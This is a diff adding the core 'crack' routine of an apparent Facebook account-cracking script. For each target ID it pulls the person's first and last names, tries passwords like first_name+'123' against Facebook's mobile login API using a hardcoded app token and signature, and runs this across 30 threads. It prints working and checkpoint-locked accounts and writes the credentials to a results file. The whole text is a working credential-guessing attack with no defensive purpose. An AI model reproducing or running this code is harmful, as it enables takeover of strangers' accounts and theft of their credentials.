@@ -1,0 +1,53 @@
+#### CRACK ####
+	def crack(asw):
+		user=asw
+		try:
+			ya=s.get(url+user+'/?access_token='+token).json()
+			pas1=ya['first_name']+'123'
+			b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+			if 'access_token' in b:
+				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1)
+				ok.append(user+pas1)
+			else:
+				if 'www.facebook.com' in b['error_msg']:
+					print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas1)
+					cp.append(user+pas1)
+					c=open('result/cp.txt','a')
+					c.write(user+' | '+pas1+' >> '+sub+'\n')
+					c.close()
+				else:
+					pas2=ya['last_name']+'123'
+					b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+					if 'access_token' in b:
+						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2)
+						ok.append(user+pas2)
+					else:
+						if 'www.facebook.com' in b['error_msg']:
+							print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas2)
+							cp.append(user+pas2)
+							c=open('result/cp.txt','a')
+							c.write(user+' | '+pas2+' >> '+sub+'\n')
+							c.close()
+						else:
+							pas3=ya['first_name']+'12345'
+							b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+							if 'access_token' in b:
+								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3)
+								ok.append(user+pas3)
+							else:
+								if 'www.facebook.com' in b['error_msg']:
+									print(m+'['+k+'CP+'+m+'] '+p+user+m+' | '+p+pas3)
+									cp.append(user+pas3)
+									c=open('result/cp.txt','a')
+									c.write(user+' | '+pas3+' >> '+sub+'\n')
+									c.close()
+									
+				
+		except:
+			pass
+			
+	f = ThreadPool(30)
+	f.map(crack, id)
+	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+	print(m+'['+p+'+'+m+']'+p+' Total '+h+'OK'+p+'/'+k+'CP'+p+' : '+h+str(len(ok))+p+' / '+k+str(len(cp)))
+	print(m+'['+h+'+'+m+']'+p+' CP file saved : '+h+'result/cp.txt')
